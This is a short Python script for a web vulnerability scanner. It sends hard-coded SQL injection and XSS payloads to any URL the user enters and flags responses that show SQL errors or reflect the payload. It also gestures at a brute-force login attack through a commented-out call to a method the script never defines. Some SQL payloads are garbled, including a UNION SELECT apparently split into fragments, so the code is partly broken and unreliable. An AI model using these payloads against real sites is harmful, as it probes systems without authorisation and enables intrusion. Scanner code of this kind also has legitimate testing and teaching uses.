import requests
import re
import string
import itertools
from bs4 import BeautifulSoup

class WebVulnScanner:
    """
    A class that scans a web application for SQL injection and XSS vulnerabilities, and performs brute-force attacks.
    """

    def __init__(self, target_url):
        """
        Initializes the WebVulnScanner class with the target URL.

        Args:
            target_url (str): The URL of the target web application.
        """
        self.target_url = target_url

    def detect_sql_injection(self):
        """
        Detects SQL injection vulnerabilities in the target web application.

        Returns:
            bool: True if SQL injection vulnerability is detected, False otherwise.
        """
        # Define a list of common SQL injection payloads
        sql_injection_payloads = [
            "' OR '1'='1",
            "UN', '",
            "`",
            ")",
            "(",
            "/*ION SELECT * FROM users--",
            "--",
            "';",
            "*/",
            "#"
        ]

        # Iterate through the payloads and check for SQL injection
        for payload in sql_injection_payloads:
            url = self.target_url + payload
            response = requests.get(url)
            if "SQL syntax" in response.text or "error in your SQL syntax" in response.text:
                print(f"SQL injection vulnerability detected with payload: {payload}")
                return True

        return False

    def detect_xss(self):
        """
        Detects XSS vulnerabilities in the target web application.

        Returns:
            bool: True if XSS vulnerability is detected, False otherwise.
        """
        # Define a list of common XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]

        # Iterate through the payloads and check for XSS
        for payload in xss_payloads:
            url = self.target_url + payload
            response = requests.get(url)
            if payload in response.text:
                print(f"XSS vulnerability detected with payload: {payload}")
                return True

        return False

# Example usage
url = input("Enter URL with http:// : ")
scanner = WebVulnScanner(url)

# Detect SQL injection vulnerability
if scanner.detect_sql_injection():
    print("SQL injection vulnerability detected!")
else:
    print("No SQL injection vulnerability detected.")

# Detect XSS vulnerability
if scanner.detect_xss():
    print("XSS vulnerability detected!")
else:
    print("No XSS vulnerability detected.")

# Perform brute-force attack
# username_list = ["admin", "user", "guest"]
# password_list = ["password123", "admin123", "guest123"]
# if scanner.brute_force_login(username_list, password_list):
#     print("Brute-force attack successful!")
# else:
#     print("Brute-force attack failed.")